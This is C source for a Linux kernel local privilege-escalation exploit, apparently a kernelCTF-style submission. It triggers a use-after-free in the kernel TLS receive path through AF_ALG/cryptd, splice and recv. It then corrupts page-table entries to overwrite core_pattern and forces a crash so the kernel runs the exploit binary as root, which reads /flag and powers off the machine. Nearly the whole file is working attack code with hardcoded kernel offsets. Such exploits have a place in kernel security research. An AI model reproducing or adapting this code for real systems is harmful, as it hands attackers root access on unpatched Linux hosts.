#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/msg.h>
#include <sched.h>
#include <sys/wait.h>
#include <unistd.h>
#include <linux/if_alg.h>
#include <errno.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/sendfile.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <err.h>
#include <linux/tls.h>


#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}

#define SYSCHK(x) ({              \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
		__res;                        \
		})

#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}
#define PORT 4444


void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void setup_tls(int sock) {
	struct tls12_crypto_info_aes_ccm_128 crypto = {0};
	crypto.info.version = TLS_1_2_VERSION;
	crypto.info.cipher_type = TLS_CIPHER_AES_CCM_128;
	SYSCHK(setsockopt(sock, SOL_TCP, TCP_ULP, "tls", sizeof("tls")));
	SYSCHK(setsockopt(sock, SOL_TLS, TLS_RX, &crypto, sizeof(crypto)));
}

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

char buf[0x100000];
char *addrs[0x1000];
int main(int argc, char** argv) {
	int listener, conn, client;

	if (argc > 1)
	{

		// This section of code will be execute by root!
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag;sleep 1;echo o>/proc/sysrq-trigger");
		exit(0);
	}

	int sock = SYSCHK(socket(AF_ALG, SOCK_SEQPACKET, 0));
	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "aead",
		.salg_name = "cryptd(ccm(aes))",
	};
	char *maddr = (void *)0x200000;
	for (int i = 0; i < 0x100; i++)
		addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));

	printf("bind %d\n",bind(sock, (struct sockaddr *)&sa, sizeof(sa)));
	struct sockaddr_in addr = {0};
	socklen_t len = sizeof(addr);
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	set_cpu(0);

	// === Setup listener ===
	listener = socket(AF_INET, SOCK_STREAM, 0);
	if (listener < 0) { perror("socket listener"); exit(1); }

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	if (bind(listener, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("bind"); exit(1);
	}
	if (listen(listener, 1) < 0) {
		perror("listen"); exit(1);
	}

	// === Setup client and connect immediately ===
	client = socket(AF_INET, SOCK_STREAM, 0);
	if (client < 0) { perror("socket client"); exit(1); }

	if (connect(client, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
		perror("connect"); exit(1);
	}

	printf("[*] Client connected to server\n");

	// === Accept on server side (non-blocking because client already connected) ===
	conn = accept(listener, NULL, 0);
	if (conn < 0) {
		perror("accept"); exit(1);
	}
	printf("[*] Server accepted connection\n");
	int dummy_serv = socket(AF_INET, SOCK_STREAM, 0);
	connect(dummy_serv, (struct sockaddr *)&addr, sizeof(addr));
	int dummy_cli = accept(listener, 0, 0);

	// === Setup TLS on both ends ===
	if(fork() == 0) {
		set_cpu(0);
		int n = recv(conn, buf, 0x10000, MSG_WAITALL);
		printf("still read waitall? %d\n", n);
		//DumpHex(buf, n);
		exit(0);
	}

	usleep(1000);
	setup_tls(conn);   // server end
    //setup_tls2(client);   // client end

	unsigned char tls_record[] = {
		0x17, 0x03, 0x03, 0x00, 0x23, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x26, 0xa2, 0x33, 0xde, 0x8d, 0x94, 0xf0, 0x29, 0x6c, 0xb1, 0xaf,
		0x6a, 0x75, 0xb2, 0x93, 0xad, 0x45, 0xd5, 0xfd, 0x03, 0x51, 0x57, 0x8f,
		0xf9, 0xcc, 0x3b, 0x42};

	int pfd[2];
	pipe(pfd);

	int n = write(client, tls_record, sizeof(tls_record));
	printf("write %d\n", n);
	usleep(100);

	write(pfd[1],buf,0x800);
	n = splice(pfd[0],0,client,0,0x300,0);
	write(dummy_cli, buf, 1);

	printf("write %d\n", n);

	char* ro = SYSCHK(mmap(NULL, 0x100000, PROT_READ, MAP_SHARED|MAP_ANONYMOUS, -1, 0));

	n = recv(conn, ro, 0x100000, 0); // fill rxm->full_len by early return 
	printf("still read2? %d\n", n);
	wait(NULL); // child exit at this point
	usleep(100);
	
	printf("start spray\n");
	read(dummy_serv,buf,1); // prevent double free crash 

	printf("reclaimed?\n");
	read(pfd[0],buf,0x600);

	n = recv(conn, buf, 0x100000, 0); // trigger UAF
	printf("still read2 finish? %d\n", n);
	memset(buf,'X',0x100);
	write(pfd[1],buf,0x600);

	int sum = 0;
	for (int i = 0; i < 0x100; i++)
		sum += addrs[i][0];
	printf("Sum %d\n", sum);

	read(pfd[0],buf,0x600);
	printf("pte? %zx\n", *(size_t*)buf);

//#define ZERO_OFFSET 0x3696000
//#define CORE_PATTERN 0x2bbace0

#define ZERO_OFFSET 0x36ed000
#define CORE_PATTERN 0x2bbb340

	size_t pa = *(size_t *)&buf[0];
	pa &= 0xfffffffff000;
	pa += 0x867;
	pa -= ZERO_OFFSET;
	pa += (CORE_PATTERN & (~0xfff));
	int offset = CORE_PATTERN & (0xfff);

	write(pfd[1], &pa, 8);
	for (int i = 0; i < 0x100; i++)
		strcpy(&addrs[i][offset], "|/proc/%P/fd/666 %P");

	if(fork()==0) {
		setsid();
		crash("");
	}
	PAUSE;

	return 0;
}
